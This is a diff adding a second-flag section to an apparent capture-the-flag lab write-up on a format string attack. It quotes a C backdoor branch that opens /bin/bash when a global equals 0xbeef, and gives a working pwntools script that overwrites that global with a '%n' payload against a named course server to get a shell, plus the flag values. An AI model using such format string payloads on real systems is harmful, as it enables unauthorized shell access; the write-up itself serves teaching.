@@ -90,4 +90,48 @@ p.interactive()
 
 Thus, the flag we get is **flag{a36ac6c2b6ecee59b102cf406c2e354d}**!
 
+##Second Flag
 
+Yet again, we are going to start off by running:
+
+```bash
+checksec --file=program
+```
+
+![Alt text](./images/ctf7-4.png)
+
+
+As with the other program, we can there are cannaries and it is not a PIE.
+
+As such we are going to analyse the behaviour of main.c! The main  difference is:
+
+```C
+if(key == 0xbeef) {
+        printf("Backdoor activated\n");
+        fflush(stdout);
+        system("/bin/bash");    
+    } else 
+```
+We can see that in this case, if the _key_ value is **0xbeef** then a bash is activated and we have access to the server, allowing us to view the contents of *flag.txt*. Therefore, we must manipulate the value of *key* (which is allocated in the heap as it a global variable), and we can use a format string attack through *'%n'*. But first we must know the address of *key*.
+
+```bash
+gdb program
+p &key
+```
+
+![Alt text](./images/ctf7-5.png)
+
+We can see that address of *key* is: **0x804b324**. Now we must convert 0xbeef to string format, which is 48879. Using this information we now alter the used the previous flag exploit by writting 48875 (48879 - 4) '%n'. So we get:
+
+```Python
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4005)
+
+
+p.sendline(b"\x24\xb3\x04\x08%.48875x%1$n")
+p.interactive()
+```
+![Alt text](./images/ctf7-6.png)
+
+Thus the flag is: **flag{6ac96371637acd9b27d93579d9cbb888}**
